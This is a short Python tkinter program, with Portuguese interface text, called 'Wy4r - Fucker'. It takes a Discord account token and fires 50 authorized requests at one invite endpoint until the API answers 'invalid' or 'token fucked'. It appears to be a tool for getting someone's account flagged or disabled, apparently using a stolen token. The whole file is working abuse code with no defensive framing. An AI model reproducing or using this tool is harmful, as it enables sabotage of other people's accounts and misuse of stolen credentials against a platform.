import tkinter as tk
import requests

from tkinter import Entry, Button, Label

window = tk.Tk()
token = None

window.title("Wy4r - Fucker")
window.geometry('400x200')
window.configure(bg="gray")
window.resizable(width=False, height=False)
e = Entry(window, width=45)
e.pack()

statustxt = tk.StringVar()
statustxt.set("Insira o token e clique no botão:")

status = Label(window, textvariable=statustxt, bg="gray", fg="white")
status.pack()

def token_fucker():
    headers = {
        'Authorization': e.get()
    }
    print("fodendo o token...")
    for x in range(50):
        back = requests.post(url='https://discordapp.com/api/v6/invite/r3sSKJJ', headers=headers)
        if back.status_code == 401:
            statustxt.set("Token Invalido!")
            return
        if back.status_code == 403:
            statustxt.set("Token Fucked!")
            return


enter = Button(window, text="Token Fucker", command=token_fucker)
enter.pack()

window.mainloop()